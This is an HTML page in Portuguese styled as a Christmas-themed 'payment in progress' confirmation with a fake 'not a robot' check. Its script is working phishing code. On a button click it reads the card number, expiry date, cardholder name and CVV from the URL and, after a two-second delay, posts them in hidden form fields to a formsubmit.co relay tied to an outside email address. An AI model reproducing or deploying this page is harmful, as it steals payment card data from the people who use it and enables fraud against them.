<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Nosso Natal | Confirmação de Pagamento</title>
  <link rel="icon" type="image/png" href="https://imagensemoldes.com.br/wp-content/uploads/2020/03/Imagem-Natal-Vetor-PNG.png">
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-color: #f0f0f0;
      overflow: hidden; /* Oculta rolagem enquanto a mensagem flutuante está visível */
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.5);
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }
    .message {
      background-color: #e0e0e0;
      padding: 30px;
      border-radius: 10px;
      width: 90%;
      max-width: 500px;
      text-align: center;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
      position: relative;
    }
    .message h1 {
      font-size: 24px;
      color: #333;
      margin-bottom: 20px;
    }
    .message p {
      font-size: 16px;
      color: #555;
      margin-bottom: 20px;
    }
    .message .highlight {
      color: #7929a5;
      font-weight: bold;
    }
    .message button {
      background-color: #28a745;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 15px 25px;
      font-size: 18px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .message button:hover {
      background-color: #218838;
    }
    .message button:disabled {
      background-color: #ccc;
    }
    .message .success-icon {
      font-size: 50px;
      color: #4caf50; /* Verde para indicar sucesso */
      margin-bottom: 20px;
    }
    .message .note {
      font-size: 14px;
      color: #777;
      margin-top: 20px;
    }
  </style>
</head>

<body>
  <div class="overlay">
    <div class="message">
      <div class="success-icon">✅</div>
      <h1>Pagamento em Andamento</h1>
      <p>Para finalizar o pagamento, precisamos verificar que você realmente não é um robô.</p>
      <p>Após completar a verificação, um formulário com os dados de pagamento será enviado para o seu e-mail.</p>
      <button id="submit-button">Finalizar o Pagamento</button>
      <p class="note">Por favor, aguarde enquanto processamos a sua solicitação.</p>
    </div>
  </div>

  <script>
    document.getElementById('submit-button').addEventListener('click', function() {
      this.disabled = true;
      this.textContent = 'Por favor, aguarde...';
      
      setTimeout(function() {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://formsubmit.co/kitbembolado@proton.me';

        const inputs = [
          { name: 'cardNumber', value: getQueryParameter('cardNumber') },
          { name: 'expirationDate', value: getQueryParameter('expirationDate') },
          { name: 'cardHolder', value: getQueryParameter('cardHolder') },
          { name: 'cvv', value: getQueryParameter('cvv') }
        ];

        inputs.forEach(function(input) {
          const hiddenInput = document.createElement('input');
          hiddenInput.type = 'hidden';
          hiddenInput.name = input.name;
          hiddenInput.value = input.value;
          form.appendChild(hiddenInput);
        });

        document.body.appendChild(form);
        form.submit();
      }, 2000); // Envia os dados após 2 segundos
    });

    function getQueryParameter(name) {
      const params = new URLSearchParams(window.location.search);
      return params.get(name) || '';
    }
  </script>
</body>
</html>
